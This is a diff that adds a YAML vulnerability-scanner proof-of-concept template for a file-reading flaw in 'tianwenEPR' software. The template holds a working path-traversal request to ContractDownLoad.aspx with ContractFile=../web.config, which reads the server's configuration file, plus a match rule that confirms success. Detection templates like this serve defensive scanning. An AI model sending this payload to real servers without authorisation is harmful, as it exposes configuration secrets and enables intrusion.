@@ -1,0 +1,20 @@
+name: poc-yaml-tianwenEPR-ContractDownLoad-File-reading
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /HM/M_Main/InformationManage/ContractDownLoad.aspx?ContractFile=../web.config
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+    expression: response.status == 200 && response.body.bcontains(b'<configuration>') && response.body.bcontains(b'</configuration>')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247485313&idx=1&sn=4788d43c18efebbb1ac3aff74a77a9b8&chksm=c267b2b2f5103ba401665b975dd9d28afaf5d5a1641f28ec0f7b22c2e007dfa06eff886f6cb6&token=1439003696&lang=zh_CN#rd
